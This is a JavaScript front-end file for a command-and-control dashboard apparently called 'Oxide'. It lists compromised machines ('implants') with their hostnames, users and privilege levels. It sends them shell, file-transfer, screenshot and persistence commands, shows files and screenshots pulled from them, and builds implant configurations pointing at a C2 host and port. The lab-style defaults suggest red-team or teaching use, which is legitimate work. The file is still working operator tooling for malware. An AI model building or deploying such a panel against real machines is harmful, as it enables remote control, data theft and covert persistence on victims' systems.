/**
 * Oxide C2 Dashboard - Main Application
 * Uses safe DOM methods (no innerHTML) to prevent XSS
 */

// ============================================================================
// State Management
// ============================================================================

const state = {
  bots: [],
  selectedBot: null,
  tasks: [],
  downloads: [],
  screenshots: [],
  wsConnected: false,
};

// ============================================================================
// API Client
// ============================================================================

const api = {
  async get(url) {
    const resp = await fetch(url);
    if (resp.status === 401) {
      window.location.href = '/';
      throw new Error('Unauthorized');
    }
    if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
    return resp.json();
  },

  async post(url, data) {
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data),
    });
    if (resp.status === 401) {
      window.location.href = '/';
      throw new Error('Unauthorized');
    }
    if (!resp.ok) {
      const err = await resp.json().catch(() => ({}));
      throw new Error(err.detail || `HTTP ${resp.status}`);
    }
    return resp.json();
  },

  async logout() {
    await fetch('/api/auth/logout', { method: 'POST' });
    localStorage.removeItem('oxide_token');
    window.location.href = '/';
  },
};

// ============================================================================
// DOM Helpers (Safe - no innerHTML)
// ============================================================================

function el(tag, attrs = {}, children = []) {
  const elem = document.createElement(tag);
  for (const [key, value] of Object.entries(attrs)) {
    if (key === 'className') {
      elem.className = value;
    } else if (key === 'dataset') {
      Object.assign(elem.dataset, value);
    } else if (key.startsWith('on') && typeof value === 'function') {
      elem.addEventListener(key.slice(2).toLowerCase(), value);
    } else {
      elem.setAttribute(key, value);
    }
  }
  for (const child of children) {
    if (typeof child === 'string') {
      elem.appendChild(document.createTextNode(child));
    } else if (child) {
      elem.appendChild(child);
    }
  }
  return elem;
}

function clearElement(elem) {
  while (elem.firstChild) {
    elem.removeChild(elem.firstChild);
  }
}

// ============================================================================
// Toast Notifications
// ============================================================================

function showToast(message, type = 'info') {
  const container = document.getElementById('toast-container');
  const toast = el('div', { className: `toast toast-${type}` }, [message]);
  container.appendChild(toast);
  setTimeout(() => toast.classList.add('show'), 10);
  setTimeout(() => {
    toast.classList.remove('show');
    setTimeout(() => toast.remove(), 300);
  }, 3000);
}

// ============================================================================
// Navigation
// ============================================================================

function initNavigation() {
  const navLinks = document.querySelectorAll('.nav-link');
  const pages = document.querySelectorAll('.page');

  navLinks.forEach(link => {
    link.addEventListener('click', (e) => {
      e.preventDefault();
      const pageName = link.dataset.page;

      navLinks.forEach(l => l.classList.remove('active'));
      link.classList.add('active');

      pages.forEach(p => {
        p.classList.toggle('active', p.id === `page-${pageName}`);
      });

      // Load page data
      if (pageName === 'bots') loadBots();
      else if (pageName === 'tasks') loadTasks();
      else if (pageName === 'downloads') loadDownloads();
      else if (pageName === 'screenshots') loadScreenshots();
    });
  });

  document.getElementById('logout-btn').addEventListener('click', () => api.logout());
}

// ============================================================================
// WebSocket Connection
// ============================================================================

let ws = null;
let wsReconnectTimer = null;

function connectWebSocket() {
  const token = localStorage.getItem('oxide_token');
  if (!token) return;

  const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
  ws = new WebSocket(`${protocol}//${window.location.host}/api/ws?token=${token}`);

  ws.onopen = () => {
    state.wsConnected = true;
    updateWsStatus(true);
    showToast('Connected to server', 'success');
  };

  ws.onclose = () => {
    state.wsConnected = false;
    updateWsStatus(false);
    // Reconnect after 3 seconds
    wsReconnectTimer = setTimeout(connectWebSocket, 3000);
  };

  ws.onerror = () => {
    ws.close();
  };

  ws.onmessage = (event) => {
    try {
      const msg = JSON.parse(event.data);
      handleWsEvent(msg);
    } catch (e) {
      console.error('WebSocket message parse error:', e);
    }
  };
}

function updateWsStatus(connected) {
  const dot = document.getElementById('ws-status');
  const text = document.getElementById('ws-status-text');
  dot.classList.toggle('online', connected);
  dot.classList.toggle('offline', !connected);
  text.textContent = connected ? 'Connected' : 'Disconnected';
}

function handleWsEvent(event) {
  const { type, data } = event;

  switch (type) {
    case 'bot_connected':
    case 'bot_disconnected':
    case 'bot_heartbeat':
      // Refresh bot list
      loadBots();
      break;
    case 'command_queued':
    case 'command_dispatched':
    case 'response_received':
      // Refresh tasks if on that page
      if (document.getElementById('page-tasks').classList.contains('active')) {
        loadTasks();
      }
      // Refresh bot detail if viewing this bot
      if (state.selectedBot && data.hwid === state.selectedBot.hwid) {
        loadBotDetail(state.selectedBot.hwid);
      }
      break;
    case 'file_extracted':
      if (data.file_type === 'download') {
        loadDownloads();
      } else if (data.file_type === 'screenshot') {
        loadScreenshots();
      }
      break;
  }
}

// ============================================================================
// Bots Page
// ============================================================================

async function loadBots() {
  try {
    const bots = await api.get('/api/bots');
    state.bots = bots;
    renderBotGrid(bots);
    updateBotStats(bots);
  } catch (e) {
    showToast('Failed to load bots: ' + e.message, 'error');
  }
}

function renderBotGrid(bots) {
  const tbody = document.getElementById('bot-grid-body');
  clearElement(tbody);

  if (bots.length === 0) {
    const row = el('tr', {}, [
      el('td', { colspan: '7', className: 'empty-state' }, ['No implants connected'])
    ]);
    tbody.appendChild(row);
    return;
  }

  for (const bot of bots) {
    const row = el('tr', {
      className: state.selectedBot?.hwid === bot.hwid ? 'selected' : '',
      dataset: { hwid: bot.hwid },
      onClick: () => selectBot(bot.hwid)
    }, [
      el('td', {}, [
        el('span', { className: `status-dot ${bot.status}` })
      ]),
      el('td', {}, [bot.hwid.substring(0, 8)]),
      el('td', {}, [bot.hostname || '-']),
      el('td', {}, [bot.os || '-']),
      el('td', {}, [bot.username || '-']),
      el('td', {}, [bot.is_admin ? 'Admin' : 'User']),
      el('td', {}, [formatTime(bot.last_seen)])
    ]);
    tbody.appendChild(row);
  }
}

function updateBotStats(bots) {
  const online = bots.filter(b => b.status === 'online').length;
  const stale = bots.filter(b => b.status === 'stale').length;
  const offline = bots.filter(b => b.status === 'offline').length;

  document.getElementById('stat-online').textContent = online;
  document.getElementById('stat-stale').textContent = stale;
  document.getElementById('stat-offline').textContent = offline;
}

async function selectBot(hwid) {
  state.selectedBot = state.bots.find(b => b.hwid === hwid) || null;
  renderBotGrid(state.bots);
  await loadBotDetail(hwid);
}

async function loadBotDetail(hwid) {
  const panel = document.getElementById('bot-detail');
  panel.hidden = false;

  try {
    const bot = await api.get(`/api/bots/${hwid}`);
    const commands = await api.get(`/api/commands?hwid=${hwid}&limit=20`);
    renderBotDetail(bot, commands);
  } catch (e) {
    showToast('Failed to load bot details: ' + e.message, 'error');
  }
}

function renderBotDetail(bot, commands) {
  const panel = document.getElementById('bot-detail');
  clearElement(panel);

  // Header
  panel.appendChild(el('div', { className: 'detail-header' }, [
    el('h3', {}, [bot.hostname || bot.hwid.substring(0, 8)]),
    el('span', { className: `status-dot ${bot.status}` }),
    el('button', { className: 'btn btn-small btn-secondary', onClick: closeDetail }, ['Close'])
  ]));

  // Info grid
  const infoGrid = el('div', { className: 'info-grid' }, [
    el('div', { className: 'info-item' }, [
      el('label', {}, ['HWID']),
      el('span', {}, [bot.hwid])
    ]),
    el('div', { className: 'info-item' }, [
      el('label', {}, ['OS']),
      el('span', {}, [bot.os || '-'])
    ]),
    el('div', { className: 'info-item' }, [
      el('label', {}, ['User']),
      el('span', {}, [bot.username || '-'])
    ]),
    el('div', { className: 'info-item' }, [
      el('label', {}, ['Privileges']),
      el('span', {}, [bot.is_admin ? 'Administrator' : 'Standard User'])
    ]),
    el('div', { className: 'info-item' }, [
      el('label', {}, ['First Seen']),
      el('span', {}, [formatTime(bot.first_seen)])
    ]),
    el('div', { className: 'info-item' }, [
      el('label', {}, ['Last Seen']),
      el('span', {}, [formatTime(bot.last_seen)])
    ])
  ]);
  panel.appendChild(infoGrid);

  // Persistence info
  if (bot.persistence && bot.persistence.length > 0) {
    const persistDiv = el('div', { className: 'persistence-info' }, [
      el('h4', {}, ['Persistence'])
    ]);
    const list = el('ul', {});
    for (const p of bot.persistence) {
      list.appendChild(el('li', {}, [`${p.method}: ${p.location || 'active'}`]));
    }
    persistDiv.appendChild(list);
    panel.appendChild(persistDiv);
  }

  // Command form
  const form = el('form', { className: 'command-form', onSubmit: handleCommandSubmit }, [
    el('div', { className: 'form-group' }, [
      el('label', { for: 'cmd-type' }, ['Command']),
      createCommandSelect()
    ]),
    el('div', { className: 'form-group' }, [
      el('label', { for: 'cmd-args' }, ['Arguments']),
      el('input', { type: 'text', id: 'cmd-args', name: 'args', placeholder: 'Command arguments...' })
    ]),
    el('button', { type: 'submit', className: 'btn btn-primary' }, ['Send Command'])
  ]);
  panel.appendChild(form);

  // Command history
  const historyDiv = el('div', { className: 'command-history' }, [
    el('h4', {}, ['Recent Commands'])
  ]);

  if (commands.length === 0) {
    historyDiv.appendChild(el('p', { className: 'empty-state' }, ['No commands yet']));
  } else {
    const table = el('table', { className: 'data-table compact' }, [
      el('thead', {}, [
        el('tr', {}, [
          el('th', {}, ['Time']),
          el('th', {}, ['Command']),
          el('th', {}, ['Status']),
          el('th', {}, ['Response'])
        ])
      ])
    ]);
    const tbody = el('tbody', {});
    for (const cmd of commands) {
      tbody.appendChild(el('tr', {}, [
        el('td', {}, [formatTime(cmd.created_at)]),
        el('td', {}, [cmd.command]),
        el('td', {}, [el('span', { className: `status-badge ${cmd.status}` }, [cmd.status])]),
        el('td', { className: 'response-cell' }, [truncate(cmd.response || '-', 50)])
      ]));
    }
    table.appendChild(tbody);
    historyDiv.appendChild(table);
  }
  panel.appendChild(historyDiv);
}

function createCommandSelect() {
  const select = el('select', { id: 'cmd-type', name: 'command', required: true });
  const commands = [
    { value: 'shell', label: 'Shell Command' },
    { value: 'file_download', label: 'Download File' },
    { value: 'file_upload', label: 'Upload File' },
    { value: 'screenshot', label: 'Screenshot' },
    { value: 'persist_status', label: 'Persistence Status' },
    { value: 'persist_add', label: 'Add Persistence' },
    { value: 'persist_remove', label: 'Remove Persistence' },
    { value: 'sysinfo', label: 'System Info' },
    { value: 'exit', label: 'Exit Implant' }
  ];
  for (const cmd of commands) {
    select.appendChild(el('option', { value: cmd.value }, [cmd.label]));
  }
  return select;
}

async function handleCommandSubmit(e) {
  e.preventDefault();
  if (!state.selectedBot) return;

  const form = e.target;
  const command = form.command.value;
  const args = form.args.value;

  try {
    await api.post(`/api/bots/${state.selectedBot.hwid}/commands`, { command, args });
    showToast('Command sent', 'success');
    form.args.value = '';
    loadBotDetail(state.selectedBot.hwid);
  } catch (err) {
    showToast('Failed to send command: ' + err.message, 'error');
  }
}

function closeDetail() {
  document.getElementById('bot-detail').hidden = true;
  state.selectedBot = null;
  renderBotGrid(state.bots);
}

// ============================================================================
// Tasks Page
// ============================================================================

async function loadTasks() {
  try {
    const filter = document.getElementById('filter-status').value;
    let url = '/api/commands?limit=100';
    if (filter) url += `&status=${filter}`;
    const tasks = await api.get(url);
    state.tasks = tasks;
    renderTasks(tasks);
  } catch (e) {
    showToast('Failed to load tasks: ' + e.message, 'error');
  }
}

function renderTasks(tasks) {
  const tbody = document.getElementById('task-log-body');
  clearElement(tbody);

  if (tasks.length === 0) {
    tbody.appendChild(el('tr', {}, [
      el('td', { colspan: '6', className: 'empty-state' }, ['No tasks found'])
    ]));
    return;
  }

  for (const task of tasks) {
    tbody.appendChild(el('tr', {}, [
      el('td', {}, [formatTime(task.created_at)]),
      el('td', {}, [task.hwid.substring(0, 8)]),
      el('td', {}, [task.command]),
      el('td', {}, [truncate(task.args || '-', 30)]),
      el('td', {}, [el('span', { className: `status-badge ${task.status}` }, [task.status])]),
      el('td', { className: 'response-cell' }, [truncate(task.response || '-', 50)])
    ]));
  }
}

// ============================================================================
// Downloads Page
// ============================================================================

async function loadDownloads() {
  try {
    const downloads = await api.get('/api/downloads');
    state.downloads = downloads;
    renderDownloads(downloads);
  } catch (e) {
    showToast('Failed to load downloads: ' + e.message, 'error');
  }
}

function renderDownloads(downloads) {
  const tbody = document.getElementById('downloads-body');
  clearElement(tbody);

  if (downloads.length === 0) {
    tbody.appendChild(el('tr', {}, [
      el('td', { colspan: '6', className: 'empty-state' }, ['No downloads yet'])
    ]));
    return;
  }

  for (const dl of downloads) {
    tbody.appendChild(el('tr', {}, [
      el('td', {}, [dl.filename]),
      el('td', {}, [dl.bot_hwid.substring(0, 8)]),
      el('td', {}, [truncate(dl.remote_path || '-', 40)]),
      el('td', {}, [formatBytes(dl.size)]),
      el('td', {}, [formatTime(dl.received_at)]),
      el('td', {}, [
        el('a', {
          href: `/api/downloads/${dl.id}/file`,
          className: 'btn btn-small btn-secondary',
          download: dl.filename
        }, ['Download'])
      ])
    ]));
  }
}

// ============================================================================
// Screenshots Page
// ============================================================================

async function loadScreenshots() {
  try {
    const screenshots = await api.get('/api/screenshots');
    state.screenshots = screenshots;
    renderScreenshots(screenshots);
  } catch (e) {
    showToast('Failed to load screenshots: ' + e.message, 'error');
  }
}

function renderScreenshots(screenshots) {
  const grid = document.getElementById('screenshot-grid');
  clearElement(grid);

  if (screenshots.length === 0) {
    grid.appendChild(el('div', { className: 'empty-state' }, ['No screenshots yet']));
    return;
  }

  for (const ss of screenshots) {
    const card = el('div', { className: 'screenshot-card', onClick: () => showScreenshot(ss) }, [
      el('img', { src: `/api/screenshots/${ss.id}/thumbnail`, alt: 'Screenshot thumbnail', loading: 'lazy' }),
      el('div', { className: 'screenshot-info' }, [
        el('span', {}, [ss.bot_hwid.substring(0, 8)]),
        el('span', {}, [formatTime(ss.received_at)])
      ])
    ]);
    grid.appendChild(card);
  }
}

function showScreenshot(ss) {
  const modal = document.getElementById('screenshot-modal');
  const img = document.getElementById('screenshot-full');
  img.src = `/api/screenshots/${ss.id}/full`;
  modal.hidden = false;
}

function initScreenshotModal() {
  const modal = document.getElementById('screenshot-modal');
  const closeBtn = modal.querySelector('.modal-close');

  closeBtn.addEventListener('click', () => {
    modal.hidden = true;
  });

  modal.addEventListener('click', (e) => {
    if (e.target === modal) {
      modal.hidden = true;
    }
  });
}

// ============================================================================
// Builder Page
// ============================================================================

async function initBuilder() {
  // Load defaults
  try {
    const defaults = await api.get('/api/builder/defaults');
    document.getElementById('c2-host').value = defaults.c2_host || '127.0.0.1';
    document.getElementById('c2-port').value = defaults.c2_port || 4444;
    document.getElementById('c2-psk').value = defaults.psk || 'oxide-lab-psk';
    document.getElementById('c2-salt').value = defaults.salt_hex || '';
    document.getElementById('c2-cert-hash').value = defaults.cert_hash_hex || '';
    document.getElementById('c2-interval').value = defaults.heartbeat_interval || 30;
  } catch (e) {
    // Use form defaults
  }

  document.getElementById('builder-form').addEventListener('submit', handleBuilderSubmit);
  document.getElementById('download-config').addEventListener('click', downloadConfig);
}

let generatedConfig = null;

async function handleBuilderSubmit(e) {
  e.preventDefault();
  const form = e.target;

  const config = {
    c2_host: form.c2_host.value,
    c2_port: parseInt(form.c2_port.value, 10),
    psk: form.psk.value,
    salt_hex: form.salt_hex.value,
    cert_hash_hex: form.cert_hash_hex.value,
    heartbeat_interval: parseInt(form.heartbeat_interval.value, 10)
  };

  try {
    const result = await api.post('/api/builder', config);
    generatedConfig = result.config;

    const output = document.getElementById('builder-output');
    output.hidden = false;

    const pre = document.getElementById('config-json');
    clearElement(pre);
    pre.appendChild(document.createTextNode(JSON.stringify(generatedConfig, null, 2)));

    showToast('Configuration generated', 'success');
  } catch (err) {
    showToast('Failed to generate config: ' + err.message, 'error');
  }
}

function downloadConfig() {
  if (!generatedConfig) return;

  const blob = new Blob([JSON.stringify(generatedConfig, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'oxide_config.json';
  a.click();
  URL.revokeObjectURL(url);
}

// ============================================================================
// Utility Functions
// ============================================================================

function formatTime(isoString) {
  if (!isoString) return '-';
  const date = new Date(isoString);
  const now = new Date();
  const diffMs = now - date;
  const diffSec = Math.floor(diffMs / 1000);

  if (diffSec < 60) return `${diffSec}s ago`;
  if (diffSec < 3600) return `${Math.floor(diffSec / 60)}m ago`;
  if (diffSec < 86400) return `${Math.floor(diffSec / 3600)}h ago`;

  return date.toLocaleDateString() + ' ' + date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
}

function formatBytes(bytes) {
  if (bytes === 0 || bytes == null) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
}

function truncate(str, maxLen) {
  if (!str || str.length <= maxLen) return str || '';
  return str.substring(0, maxLen) + '...';
}

// ============================================================================
// Initialization
// ============================================================================

document.addEventListener('DOMContentLoaded', async () => {
  // Check auth
  try {
    await api.get('/api/auth/me');
  } catch (e) {
    window.location.href = '/';
    return;
  }

  initNavigation();
  initScreenshotModal();
  initBuilder();
  connectWebSocket();
  loadBots();

  // Refresh handlers
  document.getElementById('refresh-tasks').addEventListener('click', loadTasks);
  document.getElementById('refresh-downloads').addEventListener('click', loadDownloads);
  document.getElementById('refresh-screenshots').addEventListener('click', loadScreenshots);
  document.getElementById('filter-status').addEventListener('change', loadTasks);
});
